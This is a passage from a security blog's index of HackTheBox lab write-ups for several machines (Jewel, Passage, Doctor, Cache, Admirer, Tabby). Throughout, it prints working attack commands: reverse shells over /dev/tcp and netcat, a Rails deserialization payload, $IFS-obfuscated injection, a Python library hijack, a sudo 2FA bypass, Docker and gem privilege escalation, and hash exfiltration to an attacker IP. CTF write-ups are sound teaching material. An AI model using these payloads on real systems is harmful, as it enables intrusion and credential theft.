@current_user.username end else @current_username = &quot;guest&quot; end return @current_username end viewing the code it is clear that somewhere in the username update field is vulnerable for this exploit.User Exploiting If we go to 10.10.10.211:8080 there is a signup option and create an account and go to profile there is a username update option http://10.10.10.211:8080/users/19/edit Found the vulnerability and its location now time to exploit it. For exploiting it we need to install rail console to create payload that specified in the PoC: install the same Rail version that is vulnerable for this exploit. starting console: $ bundle exec rails consoleirb(main):&amp;gt; Creating Payload code = &#39;`/bin/bash -c &quot;bash -i &amp;amp;&amp;gt;/dev/tcp/{IP}/4141 0&amp;gt;&amp;amp;1&quot;`&#39;erb = ERB.allocateerb.instance_variable_set :@src, codeerb.instance_variable_set :@filename, &quot;1&quot;erb.instance_variable_set :@lineno, 1payload Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)puts &quot;Payload&quot;require &#39;uri&#39;puts URI.encode_www_form(payload: payload) this give us usr encoded payload. start netcat, intercept the username update request in burp, past payload in username field and forward the request and then refresh the page and payload get execute and we get shell. Privilege Escalation Running linpeas with -a one funny thing happened i get sudo password of user bill: but i don’t thing that this is the intentional way. digging more i found a unusual file in /var/backups/ dump_2020-08-27.sql. (remote) bill@jewel.htb:/var/backups$ grep -E &quot;bill&quot;\\|&quot;jennifer&quot; dump_2020-08-27.sql 2 jennifer jennifer@mail.htb 2020-08-27 05:44:28.551735 2020-08-27 05:44:28.551735 $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO1 bill bill@mail.htb 2020-08-26 10:24:03.878232 2020-08-27 09:18:11.636483 $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW these hashes are different form last time and when try to crack them i successfully crack bill hash and get the same password that linpeas cracked. (remote) bill@jewel.htb:/var/backups$ grep -E &quot;bill&quot;\\|&quot;jennifer&quot; dump_2020-08-27.sql | awk &#39;{print $2&quot;:&quot;$8}&#39; &amp;gt; /dev/tcp/10.10.15.71/4141❯ nc -nvlp 4141 &amp;gt; hasheslistening on [any] 4141 ...connect to [10.10.15.71] from (UNKNOWN) [10.10.10.211] 41058❯ cat hashesjennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDObill:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW❯ john hashes -w=/usr/share/wordlists/rockyou.txt&amp;lt;snip&amp;gt;❯ john hashes --showbill:spongebob1 password hash cracked, 1 left Root running sudo -l with user bill password asking for Verification code. (remote) bill@jewel.htb:/home/bill$ sudo -l[sudo] password for bill: Verification code: You type like I drive.[sudo] password for bill: Verification code: Take a stress pill and think things over.[sudo] password for bill: Verification code: sudo: 3 incorrect password attempts google tells me that sudo also have 2FA and that is enable here. found on this article this article tells that sudo 2AF use pam_google_authenticator.so, and this module create a secret totp key file named .google_authenticator that use to create OTP. this file present in bill home folder. from this module’s git repo that this file .google_authenticator created when configuring 2FA and use as a secret for generating OTP auth required pam_google_authenticator.so secret=${USER}/.google_authenticator And bill home folder .google_authenticator file contains the totp code that use to create OTP: (remote) bill@jewel.htb:/home/bill$ cat .google_authenticator 2UQI3R52WFCLE6JTLDCSJYMJH4&quot; WINDOW_SIZE 17&quot; TOTP_AUTH we can use that same code in any Oauth app to create that Verification code for sudo. i use this chrome authenticator addon but success is not that easy, because in 2FA depend on clock time and if both ends time is diffrent while generating code it never works. spend so much time try to sync with the box time and then found oathtool that run from terminal and create OTP using totp code. My technique is to upload the oathtool in the box and run form the box so that i don’t need to sync box time and my machine time because i’m running on same box. but this is not easy because oathtool is not a single executable binary file, it depends on some Shared libraries and while running the oathtool binary it give an error of missing library: (remote) bill@jewel.htb:/home/bill$ ./oathtool ./oathtool: error while loading shared libraries: liboath.so.0: cannot open shared object file: No such file or directory this binary expecting this: ❯ whereis liboath.so.0liboath.so: /usr/lib/x86_64-linux-gnu/liboath.so.0❯ ls -la /usr/lib/x86_64-linux-gnu/liboath.so.0lrwxrwxrwx 1 root root 16 Feb 4 13:37 /usr/lib/x86_64-linux-gnu/liboath.so.0 -&amp;gt; liboath.so.0.1.3 But this is not available in the box. So, to run oathtool successfully in the box we need to do some things before run it: upload liboath.so.0.1.3 library in the box, found here Create its symbolic link as liboath.so.0, learn about sym-links here set LD_LIBRARY_PATH to liboath.so.0.1.3 library location. run it. upload both files in the bill’s home folder: (remote) bill@jewel.htb:/home/bill$ ls -l-rw-r--r-- 1 bill bill 83960 Feb 20 10:04 liboath.so.0.1.3-rwxr-xr-x 1 bill bill 80512 Feb 20 09:53 oathtool create symbolic link: (remote) bill@jewel.htb:/home/bill$ ln -s liboath.so.0.1.3 liboath.so.0(remote) bill@jewel.htb:/home/bill$ ls -llrwxrwxrwx 1 bill bill 16 Feb 20 10:07 liboath.so.0 -&amp;gt; liboath.so.0.1.3 setting LD_LIBRARY_PATH path to current folder: (remote) bill@jewel.htb:/home/bill$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/bill(remote) bill@jewel.htb:/home/bill$ export LD_LIBRARY_PATH running: (remote) bill@jewel.htb:/home/bill$ ./oathtool -Voathtool (OATH Toolkit) 2.6.6Copyright (C) 2009-2021 Simon Josefsson.License GPLv3+: GNU GPL version 3 or later &amp;lt;https://gnu.org/licenses/gpl.html&amp;gt;.This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Written by Simon Josefsson. Now the last thing is to generate code and check if it works. code generated successfully: (remote) bill@jewel.htb:/home/bill$ ./oathtool -b --totp &#39;2UQI3R52WFCLE6JTLDCSJYMJH4&#39;015396 now time to send this code to sudo: (remote) bill@jewel.htb:/home/bill$ ./oathtool -b --totp &#39;2UQI3R52WFCLE6JTLDCSJYMJH4&#39; &amp;amp;&amp;amp; sudo -l627580[sudo] password for bill: Verification code: Matching Defaults entries for bill on jewel: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, insultsUser bill may run the following commands on jewel: (ALL : ALL) /usr/bin/gem And successfully execute sudo command. Root Exploting User can run /usr/bin/gem as any user with sudo: exploit: sudo /usr/bin/gem open -e &quot;/bin/bash -c /bin/bash&quot; rdoc From gtfobins (remote) bill@jewel.htb:/home/bill$ sudo /usr/bin/gem open -e &quot;/bin/bash -c /bin/bash&quot; rdocroot@jewel:/usr/lib/ruby/gems/2.5.0/gems/rdoc-6.0.1# iduid=0(root) gid=0(root) groups=0(root) " }, { "title": "Hackthebox - Passage", "url": "/posts/passage/", "categories": "hackthebox, linux", "tags": "cutenews 2.1.2, cve-2019-11447, usbcreator d-bus interface", "date": "2020-10-09 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.206 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.206PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)+80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Passage Newsweb server http server is running cutenews cms cutenews: CuteNews is a FREE, powerful and easy-to-use news management system based on flat files as a storage with quick installation, search function, file upload management, backup &amp;amp; restore, IP banning, permission levels supporting, flood protection and many more. Moreover Cutenews is UTF-8 fully compatible system. in the web page there is a rss feed link which goes here http://passage.htb/CuteNews/rss.php this is inside cms directory and thats how we get cms directory. going to cms directory we get login page and also cms version - Version: 2.1.2 Exploit: CVE-2019-11447 RCE ExploitDB msf module: exploit/unix/webapp/cuteNews_rce web shell using exploitDB python script we get the web user shell on the box - inside /var/www/html/CuteNews/cdata/users/ found a file named “lines” contains some password hashes - for i in $(cat /var/www/html/CuteNews/cdata/users/lines | grep -v php); do echo $i | base64 -d | grep -E &#39;[0-9a-z]{64}&#39; | grep -oE &#39;[a-z0-9]+@[a-z]+.[a-z]{3}|[0-9a-z]{64}&#39; &amp;amp;&amp;amp; echo; done crack the hash - for i in $(cat /var/www/html/CuteNews/cdata/users/lines | grep -v php); do echo $i | base64 -d | grep -E &#39;[0-9a-z]{64}&#39; | grep -oE &#39;[a-z0-9]+@[a-z]+.[a-z]{3}|[0-9a-z]{64}&#39; | tr &#39;\\n&#39; &#39;:&#39; | sed &#39;s/.$//&#39; &amp;amp;&amp;amp; echo ; done | sed &#39;/^ *$/d&#39; user shelluser:paul crack the paul password hash and the same user have shell in the box so we can try to su to user paul it looks like user paul’s .ssh directory coatins user nadav ssh key - user:nadav use that private ssh key to get nadav shell - something in the viminfo file - two config file edited owned by root - searching about these files find something interesting about USBCreator here flaw in the USBCreator D-Bus interface which: Allows an attacker with access to a user in the sudoers group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. D-Bus is a messaging system that is a core system on many Linux systems, allowing for communications between processes running on the same system. This vulnerability is in how this process, interface mistakenly allows for an attacker to trigger it to do something unintended, arbitrary write as root. i don’t understand it completely but found the exploit in the end of the article to just get the root Privesc using USBCreator D-Bus interface exploit to read root ssh key - gdbus call -y -d com.ubuntu.USBCreator -o /com/ubuntu/USBCreator -m com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_rsa true " }, { "title": "Hackthebox - Doctor", "url": "/posts/doctor/", "categories": "hackthebox, linux", "tags": "splunk 8.0.5, csrf, ssti, splunkwhisperer2", "date": "2020-09-29 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.209 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.209PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Doctor8089/tcp open ssl/http Splunkd httpd|_http-server-header: Splunkd|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2020-09-06T15:57:27|_Not valid after: 2023-09-06T15:57:27SplunkSplunk : software for searching, monitoring, and analyzing machine-generated big data via a Web-style interface.Goto : https://10.10.10.209:8089/ Splunk Atom Feed: splunkdAccess : Denied, need creds to access servicesVersion : server has Splunk build: 8.0.5vulnerability : Abusing-Splunk-ForwardersExploit : PySplunkWhispererExploit requires credsWeb_server going through webserver on port 80 first thing i notice is a email address, info@doctors.htb I add domain doctors.htb from that email to /etc/hosts and check i there is any difference. goto doctors.htb redirected to http://doctors.htb/login?next=%2F and land on a login page .Enumerating doctors.htb try default logins or some injection on login page but got nothing . in the top right corner there is a Register button .Note : registering a new account only valid for 20 minutes as the domain shows this message after registering accountYour account has been created, with a time limit of twenty minutes! after login i check pages source codes and found a comment &amp;lt;!--archive still under beta testing&amp;lt;a class=&quot;nav-item nav-link&quot; href=&quot;/archive&quot;&amp;gt;Archive&amp;lt;/a&amp;gt;--&amp;gt; goto http://doctors.htb/archive got blank page viewing source got &amp;lt;title&amp;gt;Archive&amp;lt;/title&amp;gt; this domain Doctor Secure Messaging all about posting staff messages. as a logged in user i can post a message, so i create a new message. my post is on http://doctors.htb/post/2 this shows post/2 but this is my first post, i check first post and this is a post from admin and nothing interested here. I also check /archive source again and the &amp;lt;title&amp;gt; tag now updated with my post title try injections on http://doctors.htb/post/new page i use different injection payloads from PayloadsAllTheThings found 2 successful injections in http://doctors.htb/post/new CSRF in Content field SSTI in title field I learn Both Attacks from scratchsome resources that help meServer-Side Template Injectionhttps://www.youtube.com/watch?v=3cT0uE7Y87shttps://portswigger.net/research/server-side-template-injectionhttps://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injectionCross-site request forgeryhttps://www.youtube.com/watch?v=vRBihr41JTohttps://portswigger.net/web-security/csrfCSRF TestPayload &amp;lt;a href=&quot;http://tun0/test&quot;&amp;gt;TestURL&amp;lt;/a&amp;gt;Response 10.10.10.209 - - [05/Nov/2020 15:24:15] &quot;GET /test HTTP/1.1&quot; 200 -SSTI TestPayload{ { 7 * 7 } }Response in /archive page source code &amp;lt;title&amp;gt; tag updated as 49User ExploitBoth injection give shell in the boxwith CSRFPayload : http://tun0/$(nc.traditional$IFS-e/bin/sh$IFS&#39;tun0&#39;$IFS&#39;4141&#39;) load the payload in Content field and post the message and shell pop in netcat . spaces in the code are a problem for the execution of the code, thats why i use $IFS as this is a space-replacer for Linux Bash . IFS : variable is used in shells (Bourne, POSIX, ksh, bash) as the input field separator The default value of IFS is space, tab, newline. with SSTIPayload :got that working payload from : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset load the payload in title field and post the message than go to /archive execute the payload and pop shell in netcat .Enumerating web@doctor cat /etc/passwd shows two users shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bashsplunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash linpeas script password string in apache2 logs /var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &quot;POST /reset_password?email=Guitar123&quot; 500 453 &quot;http://doctor.htb/reset_password&quot; got password, i tried that password for both users and worked for user shaun shaun:Guitar123 shaun@doctor:~$ cat user.txtcat user.txtaaaab5f8************************Local Enumeration I already found a Auth RCE for Splunk so first i try to login with these cred in splunk on port 8089 login successful and i run that exploitRoot PrivescSplunkWhisperer RCEpython SplunkWhisperer2_RCE.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost tun0 --payload &#39;nc.traditional -e &#39;/bin/sh&#39; tun0 4242&#39; open netcat listener The exploit is straightforward and get a direct rootshell on nc listener . root@doctor:/root# cat root.txtcat root.txte03b774e************************ " }, { "title": "Hackthebox - Cache", "url": "/posts/cache/", "categories": "hackthebox, linux", "tags": "openemr 5.0.1, sqli, memcache, gtfobins docker", "date": "2020-09-22 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.188 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.188PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Cache2201/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)web_server pocking around the site in firefox using inspect element tool i notice a js file in login page. functionality.js going to functionality.js revels some interesting data ...if(Password != &#39;H@v3_fun&#39;)...if(Username != &quot;ash&quot;)... Fuzzing create wordlist from website textcewl -w wordlist http://10.10.10.188 Using wfuzz tool to fuzz for sub domains or Virtual host.wfuzz -w wordlist -H &quot;HOST:FUZZ.htb&quot; -u http://10.10.10.188/ --hc 400 000000415: 302 0 L 0 W 0 Ch &quot;HMS&quot; and found Virtual Host hms.htb running on port 80hms.htb heading over to http://hms.htb i noticed: url is redirected to http://hms.htb/interface/login/login.php?site=default this is a login page login page is a instance of OpenEMR openEMR copyright 2018 GoogleSearch : openEMRsearch results OpenEMR is a medical practice management software which also supports Electronic Medical Records. It is ONC Complete Ambulatory EHR certified and it features fully integrated electronic medical records, practice management for a medical practice, scheduling, and electronic billing. 2018 openEMR releases are `5.0.1 to 5.0.1.6search : openEMR 5.0.1 - 5.0.1.6 vulnerabilitiessearch results OpenEMR &amp;lt;= 5.0.1 - (Authenticated) Remote Code Execution, ExploitDB complete documentation on openEMR 5.0.1.3 vulnerabilities, open-emr.org doc reading document i found out that there is a sql injection vuln registration page vulnerabilities User ExploitingTried the Authenticated RCE exploit with ash creds but it did not worked, after SQLi it helps so i keep it.SQLiwhyFrom openEMR document An unauthenticated user is able to bypass the Patient Portal Login by simply navigating to the registration page and modifying the requested url Some examples of pages in the portal directory that are accessible after browsing to the registration page include: -add_edit_event_user.php-find_appt_popup_user.php-get_allergies.php-get_amendments.php-get_lab_results.php-get_medications.php-get_patient_documents.php-get_problems.php-get_profile.php-portal_payment.php-messaging/messages.php-messaging/secure_chat.php-report/pat_ledger.php-report/portal_custom_report.php-report/portal_patient_report.php as document say from registration page we can modify these pages requests and access to the database using sql injectionhow navigating to the registration page request for hms.htb/portal/add_edit_event_user.php?eid=1 sqli eid=&#39;through an sql errorsqlmap Frist, capture hms.htb/portal/add_edit_event_user.php?eid=1 from registration page in burpSuite. Second, than dump data using sqlmap tool, sqlmap -r emr.req --dbs --batchsqlmap -r emr.req --dbs --batch openemr --tablessqlmap -r emr.req --dbs --batch openemr -T users_secure --dump in the dump i found user:hash Database: openemrTable: users_secure[1 entry]+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+| id | salt | username | password | last_update |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+| 1 | $2a$05$l2sTLIG6GTBeyBf7TAKL6A$ | openemr_admin | $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B. | 2019-11-21 06:38:40 |+------+--------------------------------+---------------+--------------------------------------------------------------+---------------------+...[snip]... ippsec manual sqli videojohnhash : openemr_admin:$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0Bjohn -w=/usr/share/wordlists/rockyou.txt hashxxxxxx openemr_admincredsopenemr_admin:xxxxxxUser Authenticated RCEusing script OpenEMR &amp;lt; 5.0.1 - (Authenticated) RCEippsec videopython openEMR-RCE.py http://hms.htb -u openemr_admin -p xxxxxx -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/tun0/1337 0&amp;gt;&amp;amp;1&#39; this command specified in the Exploit itself it excute reverse shell and connect back to netcat on specified port nc -nvlp 1337 I got an www-data@cache:~$ shellenumeration www-data /etc/passwd reviles that there is a use ash use ash creds to su to user ash:H@v3_fun got shell as ash user user ash have user flag ash@cache:~$ cat user.txt Local Enumeration check network services ash@cache:~$ netstat -tnlpProto Recv-Q Send-Q Local Address Foreign Address Statetcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN search for port 11211 found out that this is a Memcached server that running locally searching about Memcache on google i endup on a hackingarticles.in blog post .dump Memcache data I use telnet to connect to Memcached server from ash user shell ash@cache:~$ telnet 127.0.0.1 11211 Trying 127.0.0.1...Connected to 127.0.0.1.stats slabsSTAT active_slabs 1stats cachedump 1 0ITEM user [5 b; 0 s]ITEM passwd [9 b; 0 s]get userVALUE user 0 5luffyENDget passwdVALUE passwd 0 90n3_p1ec3END credsluffy:0n3_p1ec3ash@cache:~$ su - luffyPassword: 0n3_p1ec3luffy@cache:~$Enumeration luffy checking user luffy groups luffy@cache:~$ iduid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker) checking if there is any running container, There are not containers currently running luffy@cache:~$ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES cheacking if There is any docker image luffy@cache:~$ docker image lsREPOSITORY TAG IMAGE ID CREATED SIZEubuntu latest 2ca708c1c9cc 7 months ago 64.2MB Root Privesc found docker shell at GTFO Bins it can be used to break out from restricted environments by spawning an interactive system shell. The resulting is a root shell. docker run -v /:/mnt --rm -it alpine chroot /mnt bash in my case cache have ubuntu docker image docker run -v /:/mnt --rm -it docker chroot /mnt bash " }, { "title": "Hackthebox - Admirer", "url": "/posts/admirer/", "categories": "hackthebox, linux", "tags": "adminer 4.6.2, sudo setenv, pythonpath", "date": "2020-09-14 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.187 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.187PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)80/tcp open http Apache httpd 2.4.25 ((Debian))| http-robots.txt: 1 disallowed entry|_/admin-dir|_http-server-header: Apache/2.4.25 (Debian)|_http-title: AdmirerWeb_server /robots.txt This folder contains personal contacts and creds, so no one -not even robots- should see it - waldoDisallow: /admin-dir potential username waldo /admin-dir forbidden - permission denied Gobuster /admin-dir/gobuster dir -u http://10.10.10.187/admin-dir/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php -t 50/contacts.txt (Status: 200)/credentials.txt (Status: 200) /contacts.txt contains some emails # Penny:p.wise@admirer.htb# Rajesh:r.nayyar@admirer.htb# Amy:a.bialik@admirer.htb# Leonard:l.galecki@admirer.htb# Howard:h.helberg@admirer.htb# Bernadette:b.rauch@admirer.htb Don’t find any usages of these emails. credentials.txt contains some creds [FTP account] ftpuser:%n?4Wz}R$tTF7 [Wordpress account] admin:w0rdpr3ss01! [Internal mail account] w.cooper@admirer.htb:fgJr6q#S\\W:$P found working FTP creds FTPftp 10.10.10.187-rw-r--r-- 1 0 0 3405 Dec 02 2019 dump.sql-rw-r--r-- 1 0 0 5270987 Dec 02 2019 html.tar.gzwget FTP fileswget --user ftpuser --password &#39;%n?4Wz}R$tTF7&#39; -m ftp://10.10.10.187dump.sql html.tar.gz dump.sql holds the table of images and text shown on the main page. html.tar.gz holds the source for the webpage. tar -tf html.tar.gz assets/...images/...index.phprobots.txtutility-scripts/utility-scripts/phptest.phputility-scripts/info.phputility-scripts/db_admin.phputility-scripts/admin_tasks.phpw4ld0s_s3cr3t_d1r/w4ld0s_s3cr3t_d1r/credentials.txtw4ld0s_s3cr3t_d1r/contacts.txt Found more creds inside index.php $servername = &quot;localhost&quot;;$username = &quot;waldo&quot;;$password = &quot;]F7jLHw:*G&amp;gt;UPrTo}~A&quot;d6b&quot;;$dbname = &quot;admirerdb&quot;; and in utility-scripts/db_admin.php $servername = &quot;localhost&quot;;$username = &quot;waldo&quot;;$password = &quot;Wh3r3_1s_w4ld0?&quot;; but not working. There is a new web directory utility-scripts Gobuster /utility-scripts/gobuster dir --url http://10.10.10.187/utility-scripts/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt -t 50/adminer.php (Status: 200)/adminer.php Browsing http://10.10.10.187/utility-scripts/adminer.phpFound Adminer login panel version 4.6.2Googlesearch : adminersearch results Adminer is a Database management tool for MYSQL version 4.6.2 and above &amp;lt;4.7.0 have Serious Vulnerability, foregenix.com blog Vulnerability first discovered by security researchers Yashar Shahinzadeh, yashar medium blog How this Vulnerability works First, the attacker will access the victim’s Adminer instance, but instead of trying to connect to thevictim’s MySQL database, they connect “back” to their own MySQL database hosted on their own server. Second, using the victim’s Adminer (connected to their own database) – they use the MySQL command specifying a local file on the victim’s server. This command is used to load data from a file local to the Adminer instance, into a database.*sql command for loading file from Adminer instance LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE testFIELDS TERMINATED BY &quot;\\n&quot; User Exploitingsql First, setup mysql server in my local machine $ sudo service mysql start //start mysql service$ sudo mysql -u root //login as root user in our sql server&amp;gt; create database ladmirer; //create database&amp;gt; show databases;//setup user &amp;gt; create user &#39;luser&#39;@&#39;%&#39; IDENTIFIED BY &#39;lpass&#39;;&amp;gt; GRANT ALL PRIVILEGES ON * . * TO &#39;username&#39;@&#39;%&#39;;&amp;gt; FLUSH PRIVILEGES;&amp;gt; create table test (data VARCHAR(225)); //create test data in the created database Second , bind server to tun0 address by editing cnf file nano /etc/mysql/mariadb.conf.d/50-server.cnf bind-address = 0.0.0.0 //change bind address to tun0 or 0.0.0.0 Third, restart mysql service $ sudo service mysql restart$ mysql -h localhost -u luser -p //testing created user &amp;gt; lpass //password Fourth, login to adminer and connect back to my local sql server System = MySQLServer = tun0Username = luserPassword = lpassDatabase = ladmirer Fifth, dump remote server database by running this command from SQL Command terminal in adminer load data local infile &#39;/var/www/html/index.php&#39;into table testfields terminated by &quot;/n&quot; try to read /etc/passwd got an error reading /var/www/html/index.php dump 123 rows* Sixth, read dumped adminer.php file in SQL command terminal in adminer SELECT * from ladmirer.test; interesting data inside dump $servername = \\&quot;localhost\\&quot;;$username = \\&quot;waldo\\&quot;;$password = \\&quot;&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt;\\&quot;;$dbname = \\&quot;admirerdb\\&quot;; login into ssh with found creds waldo:&amp;amp;&amp;lt;h5b~yK3F#{PaPB&amp;amp;dA}{H&amp;gt; Local Enumeration check sudo rights for user waldo waldo@admirer:~$ sudo -l[sudo] password for waldo: Matching Defaults entries for waldo on admirer: env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, listpw=alwaysUser waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh what i have here i can set environment variables for /opt/scripts/admin_tasks.sh i can run /opt/scripts/admin_tasks.sh as root review /opt/scripts/ waldo@admirer:/opt/scripts$ ls -la-rwxr-xr-x 1 root admins 2613 Dec 2 2019 admin_tasks.sh-rwxr----- 1 root admins 198 Dec 2 2019 backup.py in admin_tasks.sh backup_web(){ if [ &quot;$EUID&quot; -eq 0 ] then echo &quot;Running backup script in the background, it might take a while...&quot; /opt/scripts/backup.py &amp;amp; else echo &quot;Insufficient privileges to perform the selected operation.&quot; fi} and in backup.py from shutil import make_archive These looks suspicious script itself not vulnerable script admin_tasks.sh calling backup.py in 6th backup_web() option. script backup.py importing shutil library Exploit surface user waldo can set environment variables for the script, sudo man this means we can set python path for /opt/scripts here i can use python hijacking to exploit root, rastating articleRoot Privesc Frist, create dummy shutil.py file with reverse shell in it. import osdef make_archive(x, y, z): os.system(&quot;nc tun0 4141 -e &#39;/bin/bash&#39;&quot;) Second, start netcat listener Third, run admin_tasks.sh script, waldo@admirer:~$ sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh 6 use option 6 to execute backup.py script using PYTHONPATH to set python path for backup.py to import shutil.py from my path. " }, { "title": "Hackthebox - Tabby", "url": "/posts/tabby/", "categories": "hackthebox, linux", "tags": "lfi, tomcat war, lxd", "date": "2020-09-13 18:30:00 +0000", "snippet": " ScanningNmapports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.194 | grep open | awk -F / &#39;{print $1}&#39; ORS=&#39;,&#39;) echo $ports &amp;amp;&amp;amp; nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.194PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open http Apache Tomcat|_http-title: Apache TomcatWeb_server on http://10.10.10.194 found email with host name E-mail us : sales@megahosting.htb add megahosting.htb in /etc/hosts there is no difference found link- in a message on web page We have recently upgraded several services. Our servers are now more secure than ever. [Read our statement on recovering from the data breach](http://megahosting.htb/news.php?file=statement) and navbar’s NEWS tab also redirect to same link http://megahosting.htb/news.php?file=statement from that link, it seems statementis a filename passed as input to the parameter fileof the page news.php. LFI test on the news.php try to view /etc/passd to test LFI **URL: **http://megahosting.htb/news.php?file=../../../../etc/passwd returns the /etc/passwd file root:x:0:0:root:/root:/bin/bash...ash:x:1000:1000:clive:/home/ash:/bin/bash this verifies the LFI vulnerability Local File Inclusion (LFI) first i tried to check the news.php source code to understand whats is going on behind this file parameter megahosting.htb/news.php?file=../news.php &amp;lt;?php$file = $_GET[&#39;file&#39;];$fh = fopen(&quot;files/$file&quot;,&quot;r&quot;);while ($line = fgets($fh)) { echo($line);}fclose($fh);?&amp;gt; there is a simple file_get_contents Filesystem Functions of PHP reading php file_get_contents doc file_get_contents — Reads entire file into a string that means i can access any file that accessible from server using LFI but can not execute any remote code or RFI spending some time on LFI but don’t file any interesting information except /etc/passwd Tomcat get default page on http://10.10.10.194:8080/ from default page found some information server is running tomcat9 file to Tomcat managing instance http://10.10.10.194:8080/manager/htmlhttp://10.10.10.194:8080/host-manager/html manager require creds to access and through an error in the error You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp. error indicate the file that contains the tomcat manager creds and i have LFI that means i can read that file. i try to google for tomcat file path and found here file path is /usr/share/tomcat9/etc/tomcat-users.xml http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml &amp;lt;role rolename=&quot;admin-gui&quot;/&amp;gt;&amp;lt;role rolename=&quot;manager-script&quot;/&amp;gt;&amp;lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&amp;gt; credstomcat:$3cureP4s5w0rd123! but creds not worked for manager because the username=&quot;tomcat&quot; user role is roles=&quot;admin-gui&quot; not roles=&quot;manager-gui&quot; which means I can’t access the manager webapp but can access to host-manager that found in default Tomcat page with managerhost-manager using tomcat:$3cureP4s5w0rd123! login successful. there is noting and can’t upload war file from herewar file The tomcat user also have another role roles=&quot;manager-script&quot;. manager-script is allow access to the text-based web service located at /manager/text. that means user tomcat can access to 